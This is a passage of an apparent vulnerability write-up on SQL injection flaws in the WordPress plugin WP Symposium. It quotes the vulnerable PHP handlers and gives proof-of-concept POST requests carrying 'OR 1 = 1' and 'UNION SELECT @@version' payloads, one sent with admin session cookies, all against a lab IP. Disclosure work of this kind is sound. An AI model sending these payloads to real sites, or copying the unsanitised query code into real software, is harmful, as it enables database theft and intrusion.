    $group = $wpdb-&gt;get_row($wpdb-&gt;prepare("SELECT * FROM ".$wpdb-&gt;prefix . 'symposium_groups WHERE gid='.$gid));</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f28c40411970412-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c40411970412-2">2</div><div class="crayon-num" data-line="crayon-53c9878f28c40411970412-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c40411970412-4">4</div><div class="crayon-num" data-line="crayon-53c9878f28c40411970412-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c40411970412-6">6</div><div class="crayon-num" data-line="crayon-53c9878f28c40411970412-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c40411970412-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f28c40411970412-1"><span class="crayon-c">// Show Group Settings</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c40411970412-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'group_menu_settings'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f28c40411970412-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c40411970412-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f28c40411970412-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c40411970412-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">gid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid1'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f28c40411970412-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c40411970412-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">group</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'symposium_groups WHERE gid='</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">gid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0026 seconds] -->
<p>However due to an incorrect use of wpdb->prepare, the groupID is never sanitized. Also the function does not check user credentials until line 616, and as such allows for a SQL injection through a simple POST request like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f28c4d701288672" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_group_functions.php
HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

action=group_menu_settings&amp;uid1=353535 OR 1 = 1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f28c4d701288672-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c4d701288672-2">2</div><div class="crayon-num" data-line="crayon-53c9878f28c4d701288672-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c4d701288672-4">4</div><div class="crayon-num" data-line="crayon-53c9878f28c4d701288672-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c4d701288672-6">6</div><div class="crayon-num" data-line="crayon-53c9878f28c4d701288672-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f28c4d701288672-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_group_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c4d701288672-2"><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line" id="crayon-53c9878f28c4d701288672-3"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c4d701288672-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-53c9878f28c4d701288672-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">49</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c4d701288672-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f28c4d701288672-7"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">group_menu_settings</span><span class="crayon-o">&amp;</span><span class="crayon-v">uid1</span><span class="crayon-o">=</span><span class="crayon-cn">353535</span><span class="crayon-h"> </span><span class="crayon-st">OR</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0023 seconds] -->
<p><strong>Analysis of loadComposeForm vulnerability</strong><br />
The loadComposeForm function in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.02/ajax/symposium_mail_functions.php?rev=552870">/ajax/symposium_mail_functions.php</a> is used to fetch the display name of an userID through a simple SQL query like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f28c54151172062" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Load Compose Forum
if ($_POST['action'] == 'loadComposeForm') {

    if (is_user_logged_in()) {

        $mail_to = $_POST["mail_to"];
        $recipient = $wpdb-&gt;get_var("SELECT display_name FROM ".$wpdb-&gt;base_prefix."users WHERE ID = ".$mail_to);

        echo $recipient;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f28c54151172062-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c54151172062-2">2</div><div class="crayon-num" data-line="crayon-53c9878f28c54151172062-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c54151172062-4">4</div><div class="crayon-num" data-line="crayon-53c9878f28c54151172062-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c54151172062-6">6</div><div class="crayon-num" data-line="crayon-53c9878f28c54151172062-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c54151172062-8">8</div><div class="crayon-num" data-line="crayon-53c9878f28c54151172062-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f28c54151172062-1"><span class="crayon-c">// Load Compose Forum</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c54151172062-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'loadComposeForm'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f28c54151172062-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c54151172062-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f28c54151172062-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c54151172062-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">mail_to</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"mail_to"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f28c54151172062-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">recipient</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT display_name FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE ID = "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">mail_to</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c54151172062-8">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f28c54151172062-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">recipient</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0025 seconds] -->
<p>It first checks if the user is logged in, and then takes to mail_to POST parameter and append it to the query. But because there is no validation that the mail_to variable is in fact an integer, we can make a POST request if we have an authentication cookie, and exploit this SQL injection vulnerability:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f28c5a684186702" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_mail_functions.php HTTP/1.1
Host: 192.168.80.130
Cookie: wordpress_f3e14e7fde6969eb515c450fed50d259=admin%7C1340114858%7Ccb77d4fd4fcd2448f70ceefc746f38fe;  wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1340114858%7C486bd8321f9973799f837e666abb40f4;
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

action=loadComposeForm&amp;mail_to=1335353 UNION SELECT @@version</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f28c5a684186702-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c5a684186702-2">2</div><div class="crayon-num" data-line="crayon-53c9878f28c5a684186702-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c5a684186702-4">4</div><div class="crayon-num" data-line="crayon-53c9878f28c5a684186702-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c5a684186702-6">6</div><div class="crayon-num" data-line="crayon-53c9878f28c5a684186702-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f28c5a684186702-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_mail_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c5a684186702-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f28c5a684186702-3"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1340114858</span><span class="crayon-o">%</span><span class="crayon-cn">7Ccb77d4fd4fcd2448f70ceefc746f38fe</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1340114858</span><span class="crayon-o">%</span><span class="crayon-cn">7C486bd8321f9973799f837e666abb40f4</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c5a684186702-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-53c9878f28c5a684186702-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">63</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c5a684186702-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f28c5a684186702-7"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">loadComposeForm</span><span class="crayon-o">&amp;</span><span class="crayon-v">mail_to</span><span class="crayon-o">=</span><span class="crayon-cn">1335353</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">@</span><span class="crayon-i">version</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0031 seconds] -->
<p><strong>Analysis of getReply vulnerability</strong><br />
The getReply function in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.02/ajax/symposium_mail_functions.php?rev=552870">/ajax/symposium_mail_functions.php</a> is used to fetch the display name of a recipient and message information about a particular mail.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f28c6e800919152" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Get reply info
if ($_POST['action'] == 'getReply') {

    if (is_user_logged_in()) {

        $mid = $_POST["mail_id"];
        $recipient_id = $_POST["recipient_id"];

        $recipient = $wpdb-&gt;get_var("SELECT display_name FROM ".$wpdb-&gt;base_prefix."users WHERE ID = ".$recipient_id);
        $mail_message = $wpdb-&gt;get_row("SELECT m.*, u.display_name FROM ".$wpdb-&gt;base_prefix."symposium_mail m LEFT JOIN ".$wpdb-&gt;base_prefix."users u ON m.mail_from = u.ID WHERE mail_mid = ".$mid);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f28c6e800919152-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c6e800919152-2">2</div><div class="crayon-num" data-line="crayon-53c9878f28c6e800919152-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c6e800919152-4">4</div><div class="crayon-num" data-line="crayon-53c9878f28c6e800919152-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c6e800919152-6">6</div><div class="crayon-num" data-line="crayon-53c9878f28c6e800919152-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c6e800919152-8">8</div><div class="crayon-num" data-line="crayon-53c9878f28c6e800919152-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c6e800919152-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f28c6e800919152-1"><span class="crayon-c">// Get reply info</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c6e800919152-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'getReply'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f28c6e800919152-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c6e800919152-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f28c6e800919152-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c6e800919152-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">mid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"mail_id"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f28c6e800919152-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">recipient_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"recipient_id"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c6e800919152-8">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f28c6e800919152-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">recipient</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT display_name FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE ID = "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">recipient_id</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c6e800919152-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">mail_message</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT m.*, u.display_name FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_mail m LEFT JOIN "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u ON m.mail_from = u.ID WHERE mail_mid = "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">mid</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0037 seconds] -->
<p>It first checks if the user is logged in, and then takes to mail_id and recipient_id POST parameter and stitches those into 2 SQL queries using simple concatenation. However due to a lack of validation of the parameters being integers, we can exploit this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f28c78430032985" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
